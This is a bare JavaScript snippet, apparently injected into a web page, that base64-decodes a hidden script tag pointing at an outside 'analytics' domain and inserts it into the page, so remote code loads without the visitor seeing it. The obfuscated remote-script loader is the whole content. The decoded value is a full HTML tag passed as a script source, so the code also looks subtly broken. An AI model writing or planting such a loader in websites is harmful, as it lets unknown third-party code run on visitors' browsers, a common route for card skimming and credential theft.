var string = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8vYW5hbHl0aWNzLnNob3BzdGF0MS5jb20vZGF0ZWpzLmpzIj48L3NjcmlwdD4=';
var decodedString = atob(string);




var js = document.createElement('script');
js.src = ''+ decodedString +'';
var first = document.getElementsByTagName('script')[0];
first.parentNode.insertBefore(js, first);
